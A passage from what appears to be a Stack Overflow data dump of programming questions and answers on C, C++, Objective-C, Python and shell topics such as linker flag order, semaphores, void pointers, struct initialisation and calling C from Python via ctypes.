<p>For example, if my two arrays are something like this:</p>

<pre><code>array_name = {""Mark"", ""Steve"", ""Bill};
array_id   = {""123456"", ""654321"", ""13579""};
</code></pre>

<p>I want, at the end, something like this:</p>

<pre><code>array_name = {""Bill"", ""Mark"", ""Steve""};
array_id   = {""13579"", ""123456"", ""654321""};
</code></pre>

<p>What do you suggest me? Thanks!</p>
","9530","","<p>You can use any of the 3 methods <a href=""http://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSDictionary_Class/Reference/Reference.html"" rel=""nofollow""><code>-keysSortedByValueUsingSelector:</code></a>, <a href=""http://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSDictionary_Class/Reference/Reference.html"" rel=""nofollow""><code>-keysSortedByValueUsingComparator:</code></a>, or <a href=""http://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSDictionary_Class/Reference/Reference.html"" rel=""nofollow""><code>-keysSortedByValueWithOptions:usingComparator:</code></a> to get an array of the keys sorted in order.  So, if you want to iterate in order, you can do something like this:</p>

<pre><code>NSDictionary *myDict = ...;
for (id key in [myDict keysSortedByValueUsingSelector:@selector(compare:)])
{
    id value = [myDict objectForKey:key];
    // Do stuff with (key, value)
}
</code></pre>

<p>If you need a separate array containing all of the values in the order corresponding to the sorted order of the keys, then do the above iteration and construct that array.</p>
"
"<p>Is there any elegant way of splitting a list/dict into two lists/dicts in python, taking in some arbitrary splitter function? </p>

<p>I could easily have two list comprehensions, or two selects, but it seems to me there should be some better way of doing it that avoids iterating over every element twice.</p>

<p>I could do it easily with a for loop and if statement, but that takes something like 7 lines of code for what should be a very simple operation.</p>

<p>Any ideas?</p>

<p>Edit:</p>

<p>Just for reference, my two solutions would be,</p>

<pre><code># given dict cows, mapping cow names to weight
# fast solution
fatcows = {}
thincows = {}
for name, weight in cows:
    if weight &lt; 100:
        thincows[name] = weight
    else:
        fatcows[name] = weight

# double-list-comprehension solution would be
fatcows = {name: weight for name, weight in cows.items() if weight &gt; 100}
thincows = {name: weight for name, weight in cows.items() if weight &lt; 100}
</code></pre>

<p>I was thinking there must be something more elegant than this that i never thought of, something like:</p>

<pre><code>thincows, fatcows = ??? short expression involving cows ???
</code></pre>

<p>I know it's possible to do by writing higher order functions stuff to do it for me, and i know how to do it manually. I was just wondering if there was some super-elegant language feature to do it for me. </p>

<p>It's like you can write your own subroutines and whatnot to do a SELECT on a list, or you can just say </p>

<pre><code>thincows = select(cows, lambda c: c.weight &lt; 100)
</code></pre>

<p>I was hoping there would be some similarly elegant way of <em>splitting</em> the list, with one pass</p>
","9530","","<p>Any solution is going to take O(N) time to compute, whether it be through two passes through the list or one pass that does more work per item.  The simplest way is just to use the tools that are available to you: <a href=""http://docs.python.org/library/itertools.html#itertools.ifilter"" rel=""nofollow""><code>itertools.ifilter</code></a> and <a href=""http://docs.python.org/library/itertools.html#itertools.ifilterfalse"" rel=""nofollow""><code>itertools.ifilterfalse</code></a>:</p>

<pre><code>def bifurcate(predicate, iterable):
    """"""Returns a tuple of two lists, the first of which contains all of the
       elements x of `iterable' for which predicate(x) is True, and the second
       of which contains all of the elements x of `iterable` for which
       predicate(x) is False.""""""
    return (itertools.ifilter(predicate, iterable),
            itertools.ifilterfalse(predicate, iterable))
</code></pre>
"
"<p>I'm going to use webdis but get and error on linking stage. Webdis is a web face for redis database. You can find it here: <a href=""http://webd.is"" rel=""nofollow"">http://webd.is</a> .</p>

<p>My system configuration is:</p>

<pre><code>* Ubuntu Oneiric Ocelot (11.10 Alpha)
* Gcc 4.6
* Linux kernel 3.0.0-7
</code></pre>

<p>When I do make I get the next output:</p>

<pre><code>krolik@krolik-PC:~/Projects/webdis$ make
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o webdis.o webdis.c
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o cmd.o cmd.c
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o worker.o worker.c
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o slog.o slog.c
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o server.o server.c
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o libb64/cencode.o libb64/cencode.c
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o acl.o acl.c
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o md5/md5.o md5/md5.c
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o http.o http.c
http.c: In function ‘http_response_write’:
http.c:138:9: warning: variable ‘ret’ set but not used [-Wunused-but-set-variable]
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o client.o client.c
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o websocket.o websocket.c
websocket.c: In function ‘ws_handshake_reply’:
websocket.c:76:6: warning: variable ‘ret’ set but not used [-Wunused-but-set-variable]
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o pool.o pool.c
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o conf.o conf.c
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o formats/json.o formats/json.c
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o formats/raw.o formats/raw.c
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o formats/common.o formats/common.c
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o formats/custom-type.o formats/custom-type.c
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o formats/bson.o formats/bson.c
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o hiredis/hiredis.o hiredis/hiredis.c
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o hiredis/sds.o hiredis/sds.c
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o hiredis/net.o hiredis/net.c
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o hiredis/async.o hiredis/async.c
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o hiredis/dict.o hiredis/dict.c
hiredis/dict.c:53:21: warning: ‘dictGenHashFunction’ defined but not used [-Wunused-function]
hiredis/dict.c:73:14: warning: ‘dictCreate’ defined but not used [-Wunused-function]
hiredis/dict.c:160:12: warning: ‘dictReplace’ defined but not used [-Wunused-function]
hiredis/dict.c:182:12: warning: ‘dictDelete’ defined but not used [-Wunused-function]
hiredis/dict.c:238:13: warning: ‘dictRelease’ defined but not used [-Wunused-function]
hiredis/dict.c:258:22: warning: ‘dictGetIterator’ defined but not used [-Wunused-function]
hiredis/dict.c:268:19: warning: ‘dictNext’ defined but not used [-Wunused-function]
hiredis/dict.c:288:13: warning: ‘dictReleaseIterator’ defined but not used [-Wunused-function]
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o jansson/src/dump.o jansson/src/dump.c
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o jansson/src/error.o jansson/src/error.c
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o jansson/src/hashtable.o jansson/src/hashtable.c
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o jansson/src/load.o jansson/src/load.c
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o jansson/src/strbuffer.o jansson/src/strbuffer.c
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o jansson/src/utf.o jansson/src/utf.c
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o jansson/src/value.o jansson/src/value.c
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o jansson/src/variadic.o jansson/src/variadic.c
cc -c -O3 -Wall -Wextra -I. -Ijansson/src -Ihttp-parser -o http-parser/http_parser.o http-parser/http_parser.c
cc -levent -pthread -o webdis webdis.o cmd.o worker.o slog.o server.o libb64/cencode.o acl.o md5/md5.o http.o client.o websocket.o pool.o conf.o formats/json.o formats/raw.o formats/common.o formats/custom-type.o formats/bson.o hiredis/hiredis.o hiredis/sds.o hiredis/net.o hiredis/async.o hiredis/dict.o jansson/src/dump.o jansson/src/error.o jansson/src/hashtable.o jansson/src/load.o jansson/src/strbuffer.o jansson/src/utf.o jansson/src/value.o jansson/src/variadic.o http-parser/http_parser.o
worker.o: In function `worker_main':
worker.c:(.text+0xd): undefined reference to `event_base_new'
worker.c:(.text+0x29): undefined reference to `event_set'
worker.c:(.text+0x35): undefined reference to `event_base_set'
worker.c:(.text+0x3f): undefined reference to `event_add'
worker.c:(.text+0x6b): undefined reference to `event_base_dispatch'
worker.o: In function `worker_can_read':
worker.c:(.text+0xd2): undefined reference to `event_set'
worker.c:(.text+0xe5): undefined reference to `event_base_set'
worker.o: In function `worker_on_new_client':
worker.c:(.text+0x1f5): undefined reference to `event_set'
worker.c:(.text+0x208): undefined reference to `event_base_set'
worker.c:(.text+0x212): undefined reference to `event_add'
worker.o: In function `worker_monitor_input':
worker.c:(.text+0x2b8): undefined reference to `event_set'
worker.c:(.text+0x2cb): undefined reference to `event_base_set'
worker.o: In function `worker_can_read':
worker.c:(.text+0xf5): undefined reference to `event_add'
worker.o: In function `worker_monitor_input':
worker.c:(.text+0x2e3): undefined reference to `event_add'
server.o: In function `server_start':
server.c:(.text+0x217): undefined reference to `event_reinit'
server.c:(.text+0x338): undefined reference to `event_base_new'
server.c:(.text+0x35a): undefined reference to `event_set'
server.c:(.text+0x369): undefined reference to `event_base_set'
server.c:(.text+0x373): undefined reference to `event_add'
server.c:(.text+0x37f): undefined reference to `event_base_dispatch'
http.o: In function `http_can_write':
http.c:(.text+0x63): undefined reference to `event_set'
http.c:(.text+0x76): undefined reference to `event_base_set'
http.o: In function `http_schedule_write':
http.c:(.text+0x3f1): undefined reference to `event_set'
http.c:(.text+0x404): undefined reference to `event_base_set'
http.o: In function `http_response_write':
http.c:(.text+0x6b1): undefined reference to `event_set'
http.c:(.text+0x6c4): undefined reference to `event_base_set'
http.c:(.text+0x6ce): undefined reference to `event_add'
http.o: In function `http_response_write_chunk':
http.c:(.text+0xc36): undefined reference to `event_set'
http.c:(.text+0xc49): undefined reference to `event_base_set'
http.c:(.text+0xc53): undefined reference to `event_add'
http.o: In function `http_can_write':
http.c:(.text+0x84): undefined reference to `event_add'
http.o: In function `http_schedule_write':
http.c:(.text+0x40f): undefined reference to `event_add'
pool.o: In function `redisLibeventCleanup':
pool.c:(.text+0x89): undefined reference to `event_del'
pool.c:(.text+0x95): undefined reference to `event_del'
pool.o: In function `pool_on_disconnect':
pool.c:(.text+0x179): undefined reference to `event_set'
pool.c:(.text+0x189): undefined reference to `event_base_set'
pool.o: In function `redisLibeventAttach':
pool.c:(.text+0x266): undefined reference to `event_set'
pool.c:(.text+0x281): undefined reference to `event_set'
pool.c:(.text+0x28c): undefined reference to `event_base_set'
pool.c:(.text+0x297): undefined reference to `event_base_set'
pool.o: In function `pool_can_connect':
pool.c:(.text+0x3dd): undefined reference to `event_set'
pool.c:(.text+0x3ed): undefined reference to `event_base_set'
pool.o: In function `pool_connect':
pool.c:(.text+0x595): undefined reference to `event_set'
pool.c:(.text+0x5a5): undefined reference to `event_base_set'
pool.c:(.text+0x5b6): undefined reference to `event_add'
pool.o: In function `redisLibeventAddWrite':
pool.c:(.text+0x6a): undefined reference to `event_add'
pool.o: In function `redisLibeventAddRead':
pool.c:(.text+0x77): undefined reference to `event_add'
pool.o: In function `redisLibeventDelWrite':
pool.c:(.text+0xb8): undefined reference to `event_del'
pool.o: In function `redisLibeventDelRead':
pool.c:(.text+0xc5): undefined reference to `event_del'
pool.o: In function `pool_on_disconnect':
pool.c:(.text+0x19e): undefined reference to `event_add'
pool.o: In function `pool_can_connect':
pool.c:(.text+0x402): undefined reference to `event_add'
collect2: ld returned 1 exit status
make: *** [webdis] Помилка 1
</code></pre>

<p>I have libevent.so and libevent-dev headers installed in my /usr/lib directory and I also tried -levent2 instead of -levent in LDFLAGS variable of Makefile but still didn't got any progress. What can be the solution for my issue?</p>

<p>Thank you.</p>
","9530","","<p>You need to put the <code>-levent</code> command line option <strong>after</strong> the names of the object files in the linker command line.  From the GCC documentation on the <code>-l</code> flag:</p>

<pre><code>-llibrary
-l library
    Search the library named library when linking.  (The second
    alternative with the library as a separate argument is only for
    POSIX compliance and is not recommended.)

    It makes a difference where in the command you write this option;
    the linker searches and processes libraries and object files in the
    order they are specified.  Thus, foo.o -lz bar.o searches library z
    after file foo.o but before bar.o.  If bar.o refers to functions in
    z, those functions may not be loaded. 
</code></pre>
"
"<p>For reasons too complicated to explain here, I have the need to run a x86 GCC-compiled Linux program on a platform that is a subset of x86. This platform does not have the %gs register, 
which means it has to be emulated, because GCC relies on the presence of the %gs register. </p>

<p>Currently I have a wrapper which catches the exceptions when the program attempts to access the %gs register, and emulates it. But this is dog slow. Is there a way that I can patch the opcodes in the ELF ahead of time with equivalent instructions, so that the trap-and-emulate is avoided?</p>
","9530","","<p>Have you tried compiling your code with the <code>-mno-tls-direct-seg-refs</code> option?  From my GCC man page (i686-apple-darwin10-gcc-4.2.1):</p>

<pre><code>   -mtls-direct-seg-refs
   -mno-tls-direct-seg-refs
       Controls whether TLS variables may be accessed with offsets from
       the TLS segment register (%gs for 32-bit, %fs for 64-bit), or
       whether the thread base pointer must be added.  Whether or not this
       is legal depends on the operating system, and whether it maps the
       segment to cover the entire TLS area.

       For systems that use GNU libc, the default is on.
</code></pre>
"
"<p>This should be easy as hell, but I can't figure out the syntax on my own.</p>

<p>Couldn't really formulate the question correctly so I couldn't Google the answer. (you can get why with keywords like objective c, property, class)</p>

<p>Anyhow. In one of my classes I want to save a property which references another class, NOT an instance of another class. Which you easily can accomplish with this code:
<code>@property (nonatomic, assign) Class anotherClass;</code></p>

<p>Although, I don't want to use the generic <Code>Class</code>. I want to use my own classes, but I can't figure how, guess I'd like to do something like <code>@property (nonatomic, assign) @class(MyOwnClass) myClass;</code></p>
","9530","","<p>Objective-C doesn't have anything like templates or <a href=""http://en.wikipedia.org/wiki/Covariance_and_contravariance_%28computer_science%29"" rel=""nofollow"">covariant/contravariant return types</a>.  There's no way to say ""I want to return a <code>Class</code> object which represents a class which is a subclass of <code>MyOwnClass</code>.""  You have to use the generic <code>Class</code> pointer.</p>
"
"<p>I'm trying to add two strings together using memcpy. The first memcpy does contain the data, I require. The second one does not however add on. Any idea why?</p>

<pre><code>if (strlen(g-&gt;db_cmd) &lt; MAX_DB_CMDS )
{
      memcpy(&amp;g-&gt;db_cmd[strlen(g-&gt;db_cmd)],l-&gt;db.param_value.val,strlen(l-&gt;db.param_value.val));
      memcpy(&amp;g-&gt;db_cmd[strlen(g-&gt;db_cmd)],l-&gt;del_const,strlen(l-&gt;del_const));
      g-&gt;cmd_ctr++;
}
</code></pre>
","9530","","<p>You're not copying the null terminator, you're only coping the raw string data.  That leaves your string non-null-terminated, which can cause all sorts of problems.  You're also not checking to make sure you have enough space in your buffer, which can result in <a href=""http://en.wikipedia.org/wiki/Buffer_overflow"" rel=""nofollow"">buffer overflow vulnerabilities</a>.</p>

<p>To make sure you copy the null terminator, just add 1 to the number of bytes you're copying -- copy <code>strlen(l-&gt;db.param_value.val) + 1</code> bytes.</p>
"
"<p>I am in a soup. The idea may be bad but i do need a solution.</p>

<ul>
<li><p>I have two condition variable, say A and B.</p></li>
<li><p>Threads 1, 2 and 3 are waiting on A. Thread 4 is waiting on B.</p></li>
<li><p>B will be pthread_cond-signal() by thread 2, that is thread 4 will be
signaled to wake up by thread 2.</p></li>
</ul>

<p>Now, I have another thread 5 which pthread_cond_broadcasts() on condition variable A. I need all threads 1, 2 and 3 to wake up before thread 4 wakes up. That is say if thread 2 wakes up and signals on B thread 4 may wake up before thread 3 does, which is not what i want.</p>

<p>Any pointers will be highly appreciated.</p>

<p>thanks</p>
","9530","","<p>Use a <a href=""http://linux.die.net/man/7/sem_overview"" rel=""nofollow"">semaphore</a>: have each of threads 1-3 post the semaphore, and have thread 4 wait on the semaphore 3 times instead of on a condition variable.</p>

<p>You'll want to use <a href=""http://linux.die.net/man/3/sem_init"" rel=""nofollow""><code>sem_init(3)</code></a> or <a href=""http://linux.die.net/man/3/sem_open"" rel=""nofollow""><code>sem_open(3)</code></a> to create the semaphore, <a href=""http://linux.die.net/man/3/sem_post"" rel=""nofollow""><code>sem_post(3)</code></a> to post the semaphore, <a href=""http://linux.die.net/man/3/sem_wait"" rel=""nofollow""><code>sem_wait(3)</code></a> to wait on the semaphore, and then either <a href=""http://linux.die.net/man/3/sem_destroy"" rel=""nofollow""><code>sem_destroy(3)</code></a> (if created with <code>sem_init</code>) or <a href=""http://linux.die.net/man/3/sem_close"" rel=""nofollow""><code>sem_close(3)</code></a> and <a href=""http://linux.die.net/man/3/sem_unlink"" rel=""nofollow""><code>sem_unlink(3)</code></a> (if created with <code>sem_open</code>) to destroy the semaphore.</p>
"
"<p>I am attempting to learn more about C and its arcane hidden powers, and I attempted to make a sample struct containing a pointer to a void, intended to use as array.
EDIT: Important note: This is for raw C code.</p>

<p>Let's say I have this struct.</p>

<pre><code>    typedef struct mystruct {
        unsigned char foo;
        unsigned int max;
        enum data_t type;
        void* data;

    } mystruct;
</code></pre>

<p>I want data to hold <em>max</em> of either unsigned chars, unsigned short ints, and unsigned long ints, the data_t enum contains
 values for those 3 cases.</p>

<pre><code>    enum Grid_t {gi8, gi16, gi32}; //For 8, 16 and 32 bit uints.
</code></pre>

<p>Then I have this function that initializes and allocates one of this structs, and is supposed to return a pointer to the new struct.</p>

<pre><code>    mystruct* new(unsigned char foo, unsigned int bar, long value) {
        mystruct* new;
        new = malloc(sizeof(mystruct)); //Allocate space for the struct.
        assert(new != NULL);
        new-&gt;foo = foo;
        new-&gt;max = bar;
        int i;
        switch(type){
            case gi8: default:
                new-&gt;data = (unsigned char *)calloc(new-&gt;max, sizeof(unsigned char));
                assert(new-&gt;data != NULL);
                for(i = 0; i &lt; new-&gt;max; i++){
                    *((unsigned char*)new-&gt;data + i) = (unsigned char)value;
                    //Can I do anything with the format new-&gt;data[n]? I can't seem
                    //to use the [] shortcut to point to members in this case!
                }
            break;
        }
        return new;
    }
</code></pre>

<p>The compiler returns no warnings, but I am not too sure about this method. Is it a legitimate way to use pointers?</p>

<p>Is there a better way©?</p>

<p>I missed calling it. like mystruct* P; P = new(0,50,1024);</p>

<p>Unions are interesting but not what I wanted. Since I will have to approach every specific case individually anyway, casting seems as good as an union. I specifically wanted to have much larger 8-bit arrays than 32-bits arrays, so an union doesn't seem to help. For that I'd make it just an array of longs :P</p>
","9530","","<p>No, you cannot dereference a <code>void*</code> pointer, it is forbidden by the C language standard.  You have to cast it to a concrete pointer type before doing so.</p>

<p>As an alternative, depending on your needs, you can also use a <code>union</code> in your structure instead of a <code>void*</code>:</p>

<pre><code>typedef struct mystruct {
    unsigned char foo;
    unsigned int max;
    enum data_t type;
    union {
        unsigned char *uc;
        unsigned short *us;
        unsigned int *ui;
    } data;
} mystruct;
</code></pre>

<p>At any given time, only one of <code>data.uc</code>, <code>data.us</code>, or <code>data.ui</code> is valid, as they all occupy the same space in memory.  Then, you can use the appropriate member to get at your data array without having to cast from <code>void*</code>.</p>
"
"<p>I was surprised when the declaration:</p>

<pre><code>const std::map&lt;double, Foo*&gt; myCollection;
</code></pre>

<p>would not allow me to call non-const methods on Foo*.  I thought the const applied to the collection itself (i.e., no items could be added or removed).  I would think the way to convey item const would be:</p>

<pre><code>std::map&lt;double, Foo const*&gt; myCollection;
</code></pre>

<p>It seems the const in the first code snippet is distributive to the contents of the map instead of my assumption of applying only to the collection.</p>

<p>Am I missing something here?  It seems counter-intuitive.  How can I call non-const methods on the Foo* objects in the first declaration?</p>
","9530","","<p>You must be doing something wrong -- <code>operator[]</code> on <code>std::map</code> is not declared <code>const</code>, so it cannot be used to access elements of the map.  The reason it's not <code>const</code> is because if the key isn't present in the map, it gets added to the map with a default-constructed value, and doing so modifies the map.</p>

<p>Instead, use the <code>find</code> method to get an iterator.  The returned iterator cannot be used to modify the map, but it can be used to modify the objects which are pointed to by the values.  For example, the following code compiles and outputs <code>4</code>:</p>

<pre><code>#include &lt;iostream&gt;
#include &lt;map&gt;

typedef std::map&lt;int, int*&gt; Map;

void foo(const Map&amp; m)
{
  Map::const_iterator i = m.find(0);
  (*i-&gt;second)++;
}

int main(void)
{
  Map x;
  int y = 3;
  x[0] = &amp;y;
  foo(x);

  std::cout &lt;&lt; *x[0] &lt;&lt; std::endl;

  return 0;
}
</code></pre>
"
"<p>I'm writing a small language in C, and it requires variable setting. I have a variable table set up, but I'm getting a strange error.</p>

<pre><code>#define VAR_SIZE 100
typedef struct {
    const char *key;
    int value;
} variable;

variable Table[VAR_SIZE];
Table[0].key = NULL;
Table[0].value = 0;
</code></pre>

<p>When I run that, I get the following error:</p>

<pre><code>stack.c:8: error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘__attribute__’ before ‘-&gt;’ token
stack.c:9: error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘__attribute__’ before ‘-&gt;’ token
</code></pre>

<p>What's going on?</p>
","9530","","<p>You're trying to write code at global scope.  You can't do that.  You either need to give your global variable a static initializer, or initialize it at runtime inside of a function call.</p>

<p>An example of a static initializer:</p>

<pre><code>variable Table[VAR_SIZE] = {
    {NULL, 0},  // index 0
    {NULL, 0},  // index 1
    // etc.
};
</code></pre>

<p>Initializing at runtime:</p>

<pre><code>variable Table[VAR_SIZE];

void init_table(void) {
    Table[0].key = NULL;
    Table[0].value = 0;
    // etc.
}

int main(int argc, char **argv) {
    init_table();
    // rest of program
}
</code></pre>

<p>If you're compiling in C99 mode, you can also use a <em>designated initializer</em>:</p>

<pre><code>// The following is valid C99, but invalid C89 and invalid C++
variable Table[VAR_SIZE] = {
    [0] = {   // initialize index 0
        .key = NULL,
        .value = 0
    },
    // etc.
};
</code></pre>
"
"<p>I have been doing a lot of reading on this subject and am having a lot of trouble wrapping my brain around how this needs to happen.</p>

<p>What I want to do is have a function:</p>

<pre><code>int Add(int a, int b) { return a + b; }
</code></pre>

<p>And be able to call it from my Python scripts. How do I do this? </p>
","9530","","<p>The proper way is to <a href=""http://docs.python.org/extending/extending.html"" rel=""nofollow"">write an extension module</a>.  But if you're doing simple stuff (such as adding two integers) than can be done independently of Python, you can just write a regular shared library in C (which would be a DLL on Windows), and load it using the <a href=""http://docs.python.org/library/ctypes.html"" rel=""nofollow"">ctypes module</a>.</p>

<p>For example:</p>

<pre><code>// C code
int Add(int a, int b) { return a + b; }
</code></pre>

<p>Compile that like this:</p>

<pre><code>gcc add.c -fPIC -shared -o libadd.so
</code></pre>

<p>Then use it in Python like this:</p>

<pre><code>import ctypes
libadd = ctypes.cdll.LoadLibrary('libadd.so')
libadd.Add.argtypes = [ctypes.c_int, ctypes.c_int]
libadd.Add.restype = ctypes.c_int

print libadd.Add(42, 1)  # Prints 43
</code></pre>
"
"<p>Given a directory i'm looking for a bash one-liner to get a recursive list of all files with their size and modified time tab separated for easy parsing. Something like:</p>

<pre><code>cows/betsy       145700    2011-03-02 08:27
horses/silver    109895    2011-06-04 17:43
</code></pre>
","9530","","<p>You can use <a href=""http://linux.die.net/man/1/stat""><code>stat(1)</code></a> to get the information you want, if you don't want the full <code>ls -l</code> output, and you can use <a href=""http://linux.die.net/man/1/find""><code>find(1)</code></a> to get a recursive directory listing.  Combining them into one line, you could do this:</p>

<pre><code># Find all regular files under the current directory and print out their
# filenames, sizes, and last modified times
find . -type f -exec stat -f '%N %z %Sm' '{}' +
</code></pre>

<p>If you want to make the output more parseable, you can use <code>%m</code> instead of <code>%Sm</code> to get the last modified time as a <code>time_t</code> instead of as a human-readable date.</p>
"
"<p>I have a small framework for working with threads. The main part is an object that is basically a mutex controlled <code>std::queue</code> that one thread pushes onto, and the other thread pops from.</p>

<p>This class cannot be templated, because the types of objects can vary in a single run. Currently, I created a dumb class:</p>

<pre><code>class Object {
public:
    Object(){}
    virtual ~Object(){}
};
</code></pre>

<p>Any object that is to flow from thread to thread via this class must inherit from <code>Object</code> as it is what the <code>std::queue</code> holds. This works well, but I imagine there must be a better approach as this approach requires inheritance and many calls to <code>dynamic_cast</code>. Any ideas?</p>

<p><strong>EDIT</strong> The pointers in this case are also smart pointers, so type information is important to be maintained.</p>
","9530","","<p>Use a <code>void*</code> in your container for a ""pointer to unknown type"" (or <code>const void*</code> if the objects are immutable).  It still requires casting (and therefore type information from some other side channel), but you really don't have any other options if you want to avoid templates and inheritance.</p>
"
"<p>What possible reasons can you think of for a segmentation fault on exiting a function in C++? What I mean by that is, that I have a reproducible segmentation fault in a C++ program, and when I investigate using GDB is says</p>

<pre><code> Program received signal SIGSEGV, Segmentation fault.
 FooBar (bla=...) at foo.cpp:59
 59     }
</code></pre>

<p>where the indicated line contains the closing bracket of my function.</p>
","9530","","<p>It's quite likely a <a href=""http://en.wikipedia.org/wiki/Buffer_overrun"" rel=""nofollow"">buffer overrun</a> on some buffer located on your stack.  This overwrites the return address, so when your code tries to return to the previous stack frame, it instead jumps to some random address which is more likely than not non-executable, so you get a segmentation fault.</p>

<p>But without seeing some more code or more information about the crash, it's impossible to say what the exact cause is.</p>
"
"<p>I know how to handle this when changing <code>stringWithCString</code> in SQLite... you just <code>stringWithUTF8String</code> instead.  Is this the same with a <code>char *</code> when it is returned by <code>sysctlbyname</code>?  (see code below)</p>

<pre><code>- (NSString *) platform{
    size_t size;
    sysctlbyname(""hw.machine"", NULL, &amp;size, NULL, 0);
    char *machine = malloc(size);
    sysctlbyname(""hw.machine"", machine, &amp;size, NULL, 0);
    NSString *platform = [NSString stringWithCString:machine];
    free(machine);
    return platform;
}
</code></pre>

<p>Thanks in advance!</p>
","9530","","<p>If the C string you're using is UTF-8-encoded, then use <code>stringWithUTF8String:</code>.  If it's plain ASCII, then use <code>stringWithCString:encoding:</code> with an encoding of <code>NSASCIIStringEncoding</code>.  Otherwise, it's probably encoded using Latin-1, in which case you should use <code>stringWithCString:encoding:</code> with an encoding of <code>NSISOLatin1StringEncoding</code>.</p>

<p>In this case, <code>sysctlbyname</code> is almost certainly going to give you back an ASCII string, so you should do this:</p>

<pre><code>NSString *platform = [NSString stringWithCString:machine encoding:NSASCIIStringEncoding];
</code></pre>

<p>Though using either of the other two methods will do you no harm.</p>
"
"<p>It is possible to call reverse with arguments for example:  </p>

<pre><code>reverse('page', args=['page1'])
</code></pre>

<p>finds the url named page that takes an argument.</p>

<p>My question is how would I do this if I am using Python's map?  I want something of this form:</p>

<pre><code>map(reverse, ITERABLE)
</code></pre>

<p>where iterable is a bunch of of named urls with args.  Thus far I have been unsuccessful at doing this.</p>

<p><strong>edit based on comments and Adam's and rulfzid's answers:</strong></p>

<p>The following iterable is an example that works with both rulfzid's (editing it as my comment suggests) and Adam's answer</p>

<pre><code>iterable = [['page', ['about']], ['home', None]]
</code></pre>

<p>My only other question is which would be faster?</p>
","9530","","<p>Assuming that each item in <code>ITERABLE</code> is a tuple (or list) consisting of the URL and the arguments, you could use a lambda like so:</p>

<pre><code>map(lambda x: reverse(x[0], args=x[1]), ITERABLE)
</code></pre>
"
"<p>If there's a structure with a pointer to a struct declared within it, how do you determine the size of the sub-struct?</p>

<pre><code>typedef struct myStruct {
  int member;
  struct subStruct {
    int a;
    int b;
  } *subStruct_t;
} myStruct_t;
</code></pre>

<p>How do you allocate space for the <code>subStruct_t</code> pointer? I was thinking something along the lines of </p>

<pre><code>myStruct_t M;
M.subStruct_t = calloc(1,sizeof(myStruct_t.subStruct_t);
</code></pre>

<p>but it obviously doesn't work. Any ideas?</p>
","9530","","<p>In C, inner structs get placed in the global namespace, so you can simply use <code>sizeof(struct subStruct)</code>.  In C++, you have to use the scope resolution operator <code>::</code>, so you would instead say <code>sizeof(myStruct::subStruct)</code>.</p>

<p>You can also just use the name of the dereferenced variable -- the operands to <code>sizeof</code> are not evaluated -- so <code>sizeof(*M.subStruct_t)</code> would also work.</p>

<p>One piece of advice: do not name your struct member with the <code>_t</code> suffix.  The <code>_t</code> suffix should be used for <em>types</em>, not for variables/members.  Furthermore, POSIX reserves all identifiers with the <code>_t</code> suffix (see <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/functions/V2_chap02.html#tag_15_02_02"" rel=""nofollow"">section 2.2.2 of the POSIX.1-2008 spec</a>), so you should not name your own types with <code>_t</code>.</p>
"
"<p>I have a program, <code>P1</code>, which I need to run about 24*20000 times with different inputs. The problem is the <code>P1</code> hangs and I should force it to quite manually (<code>kill</code>). My first solution was writing a python script to call <code>P1</code> and passing the proper input and receiving the output using <code>popen</code> and <code>communicate</code>. But due to the nature of communicate which waits for the output, I can not kill the process as long as it is waiting for the response. I am on Windows.</p>

<p>I tried to use <code>multiprocess</code> function, but it only runs the <code>P1</code> and failed in sending the input to it. I am suspicious about not using pipes in <code>popen</code> and tried a little bit but I guess I can't receive the output from <code>P1</code>.</p>

<p>Any ideas? </p>

<pre><code># This code run XLE and pass the intended input to it automatically
 def startExe(programPath, programArgStr):
 p = subprocess.Popen(programPath,stdout=subprocess.PIPE,stdin=subprocess.PIPE) p.stdin.write(programArgStr)
 p.communicate()[0]
# Need to kill the process if it takes longer than it should here

def main(folder): 
.. 
#loop
programArgStr = ""create-parser""+path1+"";cd ""+ path2+""/s""+ command(counter) +"";exit""

startExe(path, programArgStr)
..
</code></pre>

<p>As you can see if P1 can finish the given task successfully it can exit itself, using the exit commands passed to it!</p>
